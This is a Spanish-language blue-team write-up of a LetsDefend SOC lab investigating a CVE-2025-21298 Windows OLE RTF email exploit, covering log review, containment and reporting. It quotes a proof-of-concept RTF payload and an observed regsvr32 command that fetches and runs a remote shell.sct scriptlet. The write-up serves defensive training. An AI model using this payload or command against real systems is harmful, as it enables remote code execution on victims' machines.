
---
title: Let’s Defend SOC336
image: /assets/img/Anexos/Pasted%20image%2020250407101344-1.png
description: Let’s Defend: SOC336 — Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025–21298)
categories: [Blue Team,LetsDefend]
tags: [soc]
---



## Introduction
Estamos dentro de un SOC y nos llega una alerta de un incidente de nivel **crírico** y tenemos que actuar.

### Description

- Name: SOC336
- Goal: Investigar el incidente
- link: [LetsDefend](https://app.letsdefend.io)


### PDF Link
- PDF: [PDF Link](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/LetsDefend/LetsDefend%20SOC336.pdf)



## Incidente


Una vez recibida la alerta en el SOC creamos un nuevo saco para esta alerta:

![](/assets/img/Anexos/Pasted%20image%2020250407090151-1.png)

### Contexto 
1. Se ha detectado -> Windows OLE Zero-Click RCE Exploitation Detection (CVE-2025–21298)
2. Se trata de un correo electrónico por Outlook.
3. Contiene un adjunto (mail.rtf)
4. La razón desencadenante (malicious RTF attachment identified with known CVE-2025–21298 exploit pattern)


La extensión RTF se refiere al ==formato de archivo Rich Text Format (Formato de Texto Enriquecido)==. Se trata de un formato de archivo que permite abrir y editar textos en varios programas de procesamiento de texto.

CVE-2025-21298 es una **vulnerabilidad de zero-click** in Windows OLE donde el atacante envia un correo malicioso con un adjunto _.rft_. Cuando la víctima abre o visualiza el correo, el atacante puede ejecutar código arbitrario dentro del sistema gracias al _.rft_. 

**Prueba de concepto**

> https://github.com/ynwarcs/CVE-2025-21298

```rtf
{\rtf1{\object\objhtml\objw1\objh1\objupdate\rsltpict{\*\objclass None}{\*\objdata 0105000002000000
0a000000
53746174696344696200
00000000
00000000
04000000
00000000
00000000
05000000
02000000
aa00
02000000
00000000
}
}}
```


**Información Importante para la investigación**

- Usuarios involucrados
- Hashes
- Direcciones IP
- Hostnames
- Ficheros
- Acciones tomadas


### Investigación

Primero acudo a webs de inteligencia para comprobar si el hash es malicioso. Inmediatamente **Virus Total** lo detecta como malicioso y detecta el CVE:

![](/assets/img/Anexos/Pasted%20image%2020250407090747-1.png)

También lo compruebo en el apartado de **Threat Intel** del SOC:

![](/assets/img/Anexos/Pasted%20image%2020250407090934-1.png)


Una vez confirmado que el adjunto es un exploit, hay que entender que ha pasado. Como la entrada del exploit fue via SMTP, voy directo a **Email Security** y comienzo a filtrar:

![](/assets/img/Anexos/Pasted%20image%2020250407091142-1.png)

Tras el filtrado, se reporta el mail que originó el ataque, fue enviado por _projectmanagement@pm.me_ a el usuario _Austin@letsdefend.io_.

![](/assets/img/Anexos/Pasted%20image%2020250407091220-1.png)

El correo es el siguiente:

![](/assets/img/Anexos/Pasted%20image%2020250407091301-1.png)

Este correo se hace pasar por el jefe de proyecto del equipo y contiene un título y cuerpo que generan urgencia.

Sabiendo esto, Vamos al apartado **Endpoint Security** y filtramos por Austin para buscar actividades sospechosas y encontramos el desencadenante:

![](/assets/img/Anexos/Pasted%20image%2020250407091442-1.png)

Se ejecuta `OUTLOOK` para visualizar el correo,  y segundos después `cmd` y `regsvr32`.

![](/assets/img/Anexos/Pasted%20image%2020250407103438-1.png)


![](/assets/img/Anexos/Pasted%20image%2020250407091553-1.png)



```powershell
regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll

# regsvr32.exe es una herramienta de línea de comandos que permite registrar y desregistrar controles OLE, como DLL y ActiveX, en el Registro de Windows

```

![](/assets/img/Anexos/Pasted%20image%2020250407091829-1.png)


OUTLOOK.EXE -> cmd.exe -> regsvr32.exe

Ahora podemos confirmar que se ha producido una ejecución de comandos explotando una vulnerabilidad en **Outlook**.  Ahora para obtener más información del servidor C2 (Command al Control) al que se ha hecho la solicitud mirando los logs y confirmar que se ha producido una conexión al C":


![](/assets/img/Anexos/Pasted%20image%2020250407092123-1.png)

Vemos que efectivamente se produjo una solicitud. Ahora el siguiente paso será ponerlo en cuarentena:


![](/assets/img/Anexos/Pasted%20image%2020250407092208-1.png)

Después de la Investigación toca reportar el incidente.

### Reporte

![](/assets/img/Anexos/Pasted%20image%2020250407092346-1.png)

En indicador ponemos "**otro**".

![](/assets/img/Anexos/Pasted%20image%2020250407092407-1.png)

En este apartado indicamos que el malware no fue eliminado ni puesto en curentena en ningún momento por el EDR:

![](/assets/img/Anexos/Pasted%20image%2020250407092446-1.png)

En el apartado análisis de malware indicamos que es malicioso ya que lo comprobamos anteriormente:

![](/assets/img/Anexos/Pasted%20image%2020250407092505-1.png)

Aquí confirmamos que hubo una petición a un C2 y se estableció la conexión:

![](/assets/img/Anexos/Pasted%20image%2020250407092529-1.png)

En los adjuntos podríamos añadir lo siguiente:

![](/assets/img/Anexos/Pasted%20image%2020250407092914-1.png)

Por último, en la nota final se podría añadir algo como:

![](/assets/img/Anexos/Pasted%20image%2020250407093225-1.png)